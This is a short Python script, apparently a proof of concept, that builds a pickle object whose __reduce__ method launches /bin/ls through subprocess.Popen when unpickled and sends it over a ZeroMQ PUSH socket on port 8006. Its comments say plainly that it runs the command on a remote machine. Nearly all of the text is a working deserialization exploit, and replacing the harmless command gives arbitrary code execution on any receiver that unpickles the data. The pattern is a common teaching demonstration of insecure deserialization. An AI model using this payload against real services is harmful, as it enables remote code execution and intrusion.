import pickle
import subprocess
import zmq
 
context = zmq.Context()
sock = context.socket(zmq.PUSH)
sock.bind("tcp://*:8006")
 
class Payload(object):
    """ Executes /bin/ls when unpickled. """
    def __reduce__(self):
        """ Run /bin/ls on the remote machine. """
        return (subprocess.Popen, (('/bin/ls',),))
 
# Send the payload over the socket
sock.send(pickle.dumps(Payload()))